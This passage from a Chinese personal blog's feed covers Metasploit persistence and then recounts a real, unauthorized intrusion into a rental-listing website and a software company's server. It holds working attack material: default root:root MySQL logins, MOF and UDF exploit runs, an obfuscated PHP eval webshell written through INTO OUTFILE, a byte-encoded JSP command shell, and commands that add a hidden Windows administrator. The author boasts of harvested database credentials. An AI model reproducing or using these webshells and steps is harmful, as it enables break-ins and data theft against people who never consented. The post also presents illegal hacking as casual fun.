class="number">26</span> script = <span class="literal">nil</span></div><div class="line"><span class="number">27</span> script_on_target = <span class="literal">nil</span></div></pre></div></div></figure><p><br></p><figure class="highlight ruby"><figcaption><span class="caption">此代码段为帮助信息</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="number">31</span>   <span class="string">"-h"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"This help menu"</span>],</div><div class="line"><span class="number">32</span>   <span class="string">"-r"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The IP of the system running Metasploit listening for the connect back"</span>],</div><div class="line"><span class="number">33</span>   <span class="string">"-p"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The port on which the system running Metasploit is listening"</span>],</div><div class="line"><span class="number">34</span>   <span class="string">"-i"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The interval in seconds between each connection attempt"</span>],</div><div class="line"><span class="number">35</span>   <span class="string">"-X"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent when the system boots"</span>],</div><div class="line"><span class="number">36</span>   <span class="string">"-U"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent when the User logs on"</span>],</div><div class="line"><span class="number">37</span>   <span class="string">"-S"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent on boot as a service (with SYSTEM privileges)"</span>],</div><div class="line"><span class="number">38</span>   <span class="string">"-A"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start a matching exploit/multi/handler to connect to the agent"</span>],</div><div class="line"><span class="number">39</span>   <span class="string">"-L"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Location in target host to write payload to, if none \%TEMP\% will be used."</span>],</div><div class="line"><span class="number">40</span>   <span class="string">"-T"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Alternate executable template to use"</span>],</div><div class="line"><span class="number">41</span>   <span class="string">"-P"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Payload to use, default is windows/meterpreter/reverse_tcp."</span>]</div></pre></div></div></figure><p><br></p><p>高亮部分为常用配置项</p><figure class="highlight plain"><figcaption><span class="caption">汉化版</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">-h    帮助信息</div><div class="line marked">-r    远程服务端监听端口</div><div class="line marked">-p    远程服务端监听端口</div><div class="line marked">-i    每隔几秒重试连接</div><div class="line">-X    更随系统自启动</div><div class="line">-U    当用户登录时自启动</div><div class="line">-S    作为服务启动</div><div class="line marked">-A    服务端自动建立handler监听服务</div><div class="line marked">-L    后门传到远程主机的位置默认为%TEMP%</div><div class="line">-T    配置模版</div><div class="line marked">-P    使用的Payload，默认windows/meterpreter/reverse_tcp</div></pre></div></div></figure><p>根据选项帮助提示执行持久化命令：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">meterpreter &gt; run persistence -S -i 5 -p 33333 -r b1g-d1ck.kionf.com -L c:\\Windows\\System32</div><div class="line"></div><div class="line"><span class="comment"># 脚本注册自启动注册表位置：HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span></div></pre></div></div></figure><hr><h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><p>测试退出当前session。ok 5秒后session又自动连接回来了</p><p><img src="https://kionf.com/article_images/meterpreter-02.jpg" alt="kionf"></p><blockquote><p><strong> 注：</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">增删改查注入自启动注册表</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># 查询Key</span></div><div class="line">meterpreter &gt; reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</div><div class="line">Enumerating: HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line"></div><div class="line">  Values (3):</div><div class="line"></div><div class="line">        SysTeM32</div><div class="line">        MDxTmrUjRGnvIaT</div><div class="line">        UxMvAJkbedJu</div><div class="line"></div><div class="line"><span class="comment"># 查询Values</span></div><div class="line">meterpreter &gt; reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v UxMvAJkbedJu</div><div class="line"></div><div class="line">Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">Name: UxMvAJkbedJu</div><div class="line">Type: REG_SZ</div><div class="line">Data: c:\Windows\System32\ANoZYsNFQVe.vbs</div><div class="line"></div><div class="line"><span class="comment"># 删除Values</span></div><div class="line">meterpreter &gt; reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v MDxTmrUjRGnvIaT</div><div class="line">Successfully deleted MDxTmrUjRGnvIaT.</div></pre></div></div></figure><blockquote><p>/usr/share/metasploit-framework/scripts/ 此目录存放run脚本<br>/usr/share/metasploit-framework/modules/   此目录存放各种脚本<br>懵逼的时候直接自己进去看脚本。</p></blockquote>]]></content>
      
      <categories>
          
          <category> kali </category>
          
          <category> metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试小记-由租房引发的惨案</title>
      <link href="/2018/09/11/hack-note-00100/"/>
      <url>/2018/09/11/hack-note-00100/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>作为一名，怀揣远(che)大(du)理(zi)想(ne)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的心慌，想直接找个房东整租一个，偶然间了解到xx网站是专为中介统计的房东房源，当然是花钱的（MM。），遂引发了以下惨案。人狠话不多，整！</p></blockquote><a id="more"></a><h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><h2 id="1-ok首先拿到网站后，先打开官网瞅了瞅"><a href="#1-ok首先拿到网站后，先打开官网瞅了瞅" class="headerlink" title="1. ok首先拿到网站后，先打开官网瞅了瞅:"></a>1. ok首先拿到网站后，先打开官网瞅了瞅:</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00101.jpg" alt="kionf"></p><p>简单分析为<code>PHP</code>写的，没有登陆房东的手机号为打码状态，凌晨1点半的我，脸上逐渐漏出笑容  ：）</p><h2 id="2-随便输入一个地址："><a href="#2-随便输入一个地址：" class="headerlink" title="2. 随便输入一个地址："></a>2. 随便输入一个地址：</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00102.jpg" alt="kionf"></p><p>看到这个丧逼脸，经验告诉我TM这就是 <code>ThinkPhp</code>框架</p><h2 id="3-在搞个随便输入个404地址"><a href="#3-在搞个随便输入个404地址" class="headerlink" title="3. 在搞个随便输入个404地址"></a>3. 在搞个随便输入个404地址</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00103.jpg" alt="kionf"></p><p>综合以上手撸，分析大概环境为：</p><figure class="highlight plain"><figcaption><span class="caption">环境</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">IIS + ThinkPHP + php + Windows</div></pre></div></div></figure><blockquote><p>此结果为手测，经验不足可以使用whatweb检测web环境</p></blockquote><figure class="highlight sh"><figcaption><span class="caption">whatweb xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">http://xxx.com/index.php/Manage/Login/index [200 OK] Cookies[BJYADMIN], Country[CHINA][CN], HTML5, HTTPServer[Microsoft-IIS/7.0], IP[115.28.xxx.xxx], JQuery[1.11.1], Microsoft-IIS[7.0], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[管理系统], X-Powered-By[thinkphp-bjyadmin, ASP.NET], X-UA-Compatible[IE=edge]</div></pre></div></div></figure><h2 id="4-域名分析"><a href="#4-域名分析" class="headerlink" title="4. 域名分析"></a>4. 域名分析</h2><figure class="highlight sh"><figcaption><span class="caption">dig xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; xxx.com</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 364</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</div><div class="line"></div><div class="line">;; OPT PSEUDOSECTION:</div><div class="line">; EDNS: version: 0, flags:; udp: 4096</div><div class="line">;; QUESTION SECTION:</div><div class="line">;lx808.com.INA</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">xxx.com.3599INCNAMEwww.xxx.com.xxx.com.</div><div class="line">www.xxx.com.xxx.com. 3600INA115.28.xxx.xxx</div><div class="line"></div><div class="line">;; Query time: 1370 msec</div><div class="line">;; SERVER: 108.61.10.10<span class="comment">#53(108.61.10.10)</span></div><div class="line">;; WHEN: Tue Sep 11 18:51:58 CST 2018</div><div class="line">;; MSG SIZE  rcvd: 82</div></pre></div></div></figure><p>获取到<code>ip：115.28.xxx.xxx</code>，查看是IP相关信息：</p><figure class="highlight sh"><figcaption><span class="fileDir">curl cip.cc/</span><span class="caption">115.28.xxx</span><span class="suffix">.xxx</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">IP: 115.28.xxx.xxx</div><div class="line">地址: 中国  山东  青岛</div><div class="line">运营商: 阿里云</div><div class="line"></div><div class="line">数据二: 山东省青岛市 | 阿里巴巴网络有限公司BGP数据中心</div><div class="line"></div><div class="line">URL: http://www.cip.cc/115.28.xxx.xxx</div></pre></div></div></figure><h2 id="5-主机信息"><a href="#5-主机信息" class="headerlink" title="5. 主机信息"></a>5. 主机信息</h2><p>脚本小子，上！<code>nmap</code> 扫描</p><figure class="highlight sh"><figcaption><span class="caption">nmap -sV -T4 -O -F --version-light 115.28.xxx</span><span class="suffix">.xxx</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">Nmap scan report <span class="keyword">for</span> 115.28.xxx.xxx</div><div class="line">Host is up (0.19s latency).</div><div class="line">Not shown: 83 closed ports</div><div class="line">PORT      STATE    SERVICE       VERSION</div><div class="line">25/tcp    filtered smtp</div><div class="line">80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">135/tcp   filtered msrpc</div><div class="line">139/tcp   filtered netbios-ssn</div><div class="line">445/tcp   filtered microsoft-ds</div><div class="line">1027/tcp  filtered IIS</div><div class="line">1028/tcp  filtered unknown</div><div class="line">3128/tcp  filtered squid-http</div><div class="line">3306/tcp  open     mysql         MySQL 5.5.40</div><div class="line">3389/tcp  open     ms-wbt-server Microsoft Terminal Service</div><div class="line">5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">8009/tcp  open     ajp13         Apache Jserv (Protocol v1.3)</div><div class="line">8080/tcp  open     http          Apache Tomcat/Coyote JSP engine 1.1</div><div class="line">49152/tcp open     unknown</div><div class="line">49153/tcp open     unknown</div><div class="line">49154/tcp open     unknown</div><div class="line">49155/tcp open     unknown</div></pre></div></div></figure><p>其中有两个个让人非常感兴趣的服务及端口：</p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">3306Mysql</div><div class="line">3389RDP</div></pre></div></div></figure><h1 id="0x01-渗透"><a href="#0x01-渗透" class="headerlink" title="0x01 渗透"></a>0x01 渗透</h1><h2 id="1-随手一输入带来的惊喜！"><a href="#1-随手一输入带来的惊喜！" class="headerlink" title="1. 随手一输入带来的惊喜！"></a>1. 随手一输入带来的惊喜！</h2><p>看到常用端口都没有更改，对外暴露。猜测安全意识估计也是很薄弱，随便用<code>root</code>：<code>root</code>连接mysql。</p><p><br></p><p><strong>Duang, Duang, Duang</strong></p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00104.jpg" alt="kionf"></p><blockquote><p>有时候就是这样百密一疏，安全问题的重中之重就是细节<br>可能你在想这么Low逼也好意思写？那么你错了，重头戏在后头！</p></blockquote><p>连接后，查看了一下数据库，根据名称找到当前网站所使用数据库。根据表名找到大概为用户账号密码信息表</p><hr><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00105.jpg" alt="kionf"></p><p>已到夜深，不想再劳体伤身，随便找个用户名，md5密码扔到<a href="http://www.dmd5.com/" target="_blank" rel="noopener">dmd5</a>解密出明文，本以为能登陆这事儿就算了，放他一马。</p><blockquote><p><strong>But !</strong></p></blockquote><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00106.jpg" alt="kionf"></p><p>提示账号密码错误，又尝试了几个账号发现，被禁用 ！！通过查看数据库记录的登陆信息and猜测，得出应该现在的网站并没有连接此数据库。深夜的我扣了扣脚丫子，发现事情并没有那么简单。</p><p><br></p><p>虽然没有使用现在的数据库，但我们是有<code>root</code>登陆到数据库的啊，权限高啊，提权啊！</p><p><strong>Let’s Go</strong></p><hr><h2 id="2-常用Low逼Mysql提权几种方式："><a href="#2-常用Low逼Mysql提权几种方式：" class="headerlink" title="2. 常用Low逼Mysql提权几种方式："></a>2. 常用Low逼Mysql提权几种方式：</h2><ul><li>UDF提权</li><li>MOF提权</li><li><code>into outfile</code>写入shell</li></ul><p>祭出我的宝贝 <code>metasploit</code></p><h3 id="1-MOF提权"><a href="#1-MOF提权" class="headerlink" title="1) MOF提权"></a>1) MOF提权</h3><figure class="highlight sh"><figcaption><span class="caption">脚本小子三部曲</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># 1. 启动msf选择exploit</span></div><div class="line"></div><div class="line">&gt; msfconsole</div><div class="line"></div><div class="line">&gt; search mysql_mof</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                             Disclosure Date  Rank       Description</div><div class="line">   ----                             ---------------  ----       -----------</div><div class="line">   exploit/windows/mysql/mysql_mof  2012-12-01       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</div><div class="line"></div><div class="line">&gt; use exploit/windows/mysql/mysql_mof</div><div class="line"></div><div class="line"><span class="comment"># 2. 设置目标</span></div><div class="line"></div><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; show options</div><div class="line"><span class="comment"># show advanced</span></div><div class="line"><span class="comment"># 显示高级选项，进行自定义这里不需要暂且不展开讨论</span></div><div class="line"></div><div class="line"></div><div class="line">Module options (exploit/windows/mysql/mysql_mof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   PASSWORD                   yes       The password to authenticate with</div><div class="line">   RHOST                      yes       The target address</div><div class="line">   RPORT     3306             yes       The target port (TCP)</div><div class="line">   USERNAME                   yes       The username to authenticate as</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   MySQL on Windows prior to Vista</div><div class="line"></div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div><div class="line"></div><div class="line"><span class="comment"># 3. 启动</span></div><div class="line">&gt; exploit</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00107.jpg" alt="kionf"></p><p>命令执行成功，没有返回session， 利用程序可能被删除</p><hr><h3 id="2-UDF提权"><a href="#2-UDF提权" class="headerlink" title="2) UDF提权"></a>2) UDF提权</h3><figure class="highlight sh"><figcaption><span class="caption">尝试UDF提权</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; search mysql_udf</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank       Description</div><div class="line">   ----                                   ---------------  ----       -----------</div><div class="line">   exploit/multi/mysql/mysql_udf_payload  2009-01-16       excellent  Oracle MySQL UDF Payload Execution</div><div class="line"></div><div class="line">&gt; use exploit/multi/mysql/mysql_udf_payload</div><div class="line">&gt; show options</div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00108.jpg" alt="kionf"></p><p>注意红框圈出位置，根据目录结构判断是PhpStudy搭建的，后面会使用到</p><p>依旧没有成功返回session，有尝试了几次MOF，发现连接Mysql被拒绝了。这时才想起机器时部署在阿里云，有一个<code>AliYunDun</code>这个小可爱，上面MOF的提权文件应该也是他删除的。</p><hr><h3 id="3-尝试写入WebShell"><a href="#3-尝试写入WebShell" class="headerlink" title="3) 尝试写入WebShell"></a>3) 尝试写入WebShell</h3><p>由上面在进行UDF提权时爆出来的是使用<code>PhpStudy</code>搭建的web环境，可以猜测出默认Web路径，使用代理连接目标Mysql执行：</p><figure class="highlight sql"><figcaption><span class="caption">查看Mysql datadir</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">&gt; select @@datadir;</div><div class="line"></div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| @@datadir                   |</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| D:\phpStudy4IIS\MySQL\data\ |</div><div class="line">+<span class="comment">-----------------------------+</span></div></pre></div></div></figure><p>本机下载相对应版本<code>安装包</code>，安装后查看到默认Web路径为<code>D:\phpStudy4IIS\WWW</code>。ok既然网站目录得到了并且通过之前的信息收集得到使用的是ThinkPHP，我们就尝试写入PHP一句话Shell。</p><figure class="highlight sql"><figcaption><span class="caption">连接目标Mysql写入Web Shell</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -proot -h115.28.xxx.xxx mysql</div><div class="line"></div><div class="line"># 写入PHP shell</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/root/sys_thinkphp.php'</span>) <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\phpStudy4IIS\WWW\sys.php'</span></div></pre></div></div></figure><p>PHP Shell文件（自定义和正常菜刀不通用）：</p><figure class="highlight php"><figcaption><span class="caption">sys_thinkphp</span><span class="suffix">.php</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$thinkss = create_function(<span class="string">'$a'</span>, <span class="string">'ev'</span>.<span class="string">'al($a);'</span>);</div><div class="line"></div><div class="line">$thinkss(stripslashes($_POST[<span class="string">'***REMOVED***'</span>]));</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></div></div></figure><p>使用浏览器访问，没要报404。shell写入成功！！</p><hr><h2 id="3-进一步渗透"><a href="#3-进一步渗透" class="headerlink" title="3. 进一步渗透"></a>3. 进一步渗透</h2><p>使用菜刀连接：</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00109.jpg" alt="kionf"></p><p>获取shell，通过查看目录结构、及asp、php、tomcat代码，这里省略一万字，获取如下信息：</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">环境:</div><div class="line">tomcat7.0</div><div class="line">IIS</div><div class="line">mysql</div><div class="line">aspx网站路径</div><div class="line"></div><div class="line">查看代码发现连接数据库为并得到密码:</div><div class="line">Mysql: 114.215.xxx.xxx</div><div class="line">Mysql: 115.29.xx.xxx</div><div class="line">SqlServer: 115.29.xx.xxx</div></pre></div></div></figure><p><strong>常用WEB服务配置文件位置：</strong></p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">ThinkPhp:  ./www/ThinkPHP/Conf/       ./www/Application/Common/Conf/</div><div class="line">Tomcat: ./tomcat/webapps/appname/WEB-INF/classes/</div><div class="line">IIS: ./www/Web.config</div></pre></div></div></figure><h2 id="4-休战"><a href="#4-休战" class="headerlink" title="4. 休战"></a>4. 休战</h2><div class="note info"><p>使用菜刀连接shell由于环境问题无法执行终端命令。看到有tomcat应用，就传上个小jsp马来执行命令,添加个用户</p></div><figure class="highlight"><figcaption><span class="caption">jsp小马马</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></div><div class="code"><pre><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</div><div class="line">&lt;HTML&gt;</div><div class="line">&lt;title&gt;Titanium&lt;/title&gt;</div><div class="line">&lt;BODY&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</div><div class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</div><div class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</div><div class="line">&lt;/FORM&gt;</div><div class="line"></div><div class="line">&lt;%!</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception</span>&#123;</div><div class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</div><div class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</div><div class="line">            str = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">32</span>&#125;) + str;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            str =  <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">32</span>&#125;) + str;</div><div class="line">        &#125;</div><div class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</div><div class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;),  <span class="keyword">new</span> Object[] &#123; str &#125;);</div><div class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</div><div class="line">        String result = <span class="string">""</span>;</div><div class="line">        result = sc.hasNext() ? sc.next() : result;</div><div class="line">        sc.close();</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line">%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">    String name =<span class="string">"Input Nothing"</span>;</div><div class="line">    String query = request.getParameter(<span class="string">"q"</span>);</div><div class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</div><div class="line">        name = getPicture(query);</div><div class="line">    &#125;</div><div class="line">%&gt;</div><div class="line"></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;%= name %&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"></div><div class="line">&lt;/BODY&gt;</div><div class="line">&lt;/HTML&gt;</div></pre></div></div></figure><figure class="highlight sh"><figcaption><span class="caption">添加Win用户设为管理员</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">net user kionf kionf /add</div><div class="line">net localgroup adminostrators kionf /add</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00115.jpg" alt="kionf"></p><p>通过查看php代码分析出，房源网站连接的是<code>SqlServer: 115.29.xx.xxx</code>，用户登录通过查询两个表。mysql用户表记录用户可以登录ip数，及绑定ip,如果First字段为0则为首次登陆，首次登陆ip写入数据库，账号密码储存在SqlServer。  登陆之！</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00114.jpg" alt="kionf"></p><hr><h1 id="0x02-千里之堤，溃于蚁穴"><a href="#0x02-千里之堤，溃于蚁穴" class="headerlink" title="0x02 千里之堤，溃于蚁穴"></a>0x02 千里之堤，溃于蚁穴</h1><p><br></p><p>在上面<a href="#3-进一步渗透">进一步渗透中</a>获取到一个数据库：</p><blockquote><p>Mysql: 114.215.xxx.xxx</p></blockquote><p>根据ThinkPHP框架配置文件中的账号密码，连接后查看数据库:</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00110.jpg" alt="kionf"></p><figure class="highlight sql"><figcaption><span class="caption">执行sql</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> @@hostname;</div><div class="line"></div><div class="line">iZxxxxxxxx</div></pre></div></div></figure><p>尝试Google下这个特别的hostname，出现了惊喜：</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00111.jpg" alt="kionf"></p><p>进一步验证得出网站路径：</p><blockquote><p><code>nmap</code>扫描机器，得出WEB端口访问<code>80</code>端口<code>404</code>，访问443成功出现界面，手测框架爆出Web路径：</p></blockquote><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00112.jpg" alt="kionf"></p><p>通过Mysql写入一句话，菜刀连之：</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00113.jpg" alt="kionf"></p><blockquote><p>root启动的nginx，权限就不用说了，根据获取信息Google此公司title，得知是一个软件外包公司，<br><code>114.215</code>此台机器应该为内部开发测试机器。而且<br>此机器安装有<code>SVN</code>,<code>wwwroot</code>目录下放置是外包的项目代码，继续延伸渗透应该会拿下整个外包公司所有机器的权限。<br>操作过程没有什么技术含量，都是点子骚，开发过程中安全意识薄弱，信息泄漏。<br>刚刚去卫生间头突然晕了一下，差点摔倒。<strong>我现在慌的一批😨</strong> 身体重要不弄了。</p></blockquote>]]></content>
      
      <categories>
          
          <category> hack-note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试小记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tailf 和 tail -f 区别</title>
      <link href="/2018/09/07/linux-tailf/"/>
      <url>/2018/09/07/linux-tailf/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>对于小文件 (大约小于5GB) 使用<strong><code>tailf</code></strong>， <strong><code>tail -f</code></strong> 没有明显区别。 一次偶然使用<strong><code>tailf</code></strong>查看一个20GB日志文件时， 发现无法显示， 而使用<strong><code>tail -f</code></strong>却可以显示。由此延伸出本文 </p></blockquote><a id="more"></a><h1 id="0x00-准备实验环境"><a href="#0x00-准备实验环境" class="headerlink" title="0x00 准备实验环境"></a>0x00 准备实验环境</h1><p><br></p><p>尝试直接<code>google</code>两者的区别发现大部分说的不是很详细，抄的也不是很好。所以自己写下来做个笔记。</p><h2 id="1-生成大文件10GB"><a href="#1-生成大文件10GB" class="headerlink" title="1. 生成大文件10GB"></a>1. 生成大文件10GB</h2><figure class="highlight sh"><figcaption><span class="caption">使用dd生成指定大小文件</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">dd <span class="keyword">if</span>=/dev/urandom of=bigFile bs=10M count=1000</div></pre></div></div></figure><h2 id="2-安装strace跟踪进程中的系统函数调用"><a href="#2-安装strace跟踪进程中的系统函数调用" class="headerlink" title="2. 安装strace跟踪进程中的系统函数调用"></a>2. 安装<code>strace</code>跟踪进程中的系统函数调用</h2><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">yum -y install strace</div></pre></div></div></figure><h2 id="3-测试载入时间"><a href="#3-测试载入时间" class="headerlink" title="3. 测试载入时间"></a>3. 测试载入时间</h2><p>分别使用 <code>tailf</code>，<code>tail 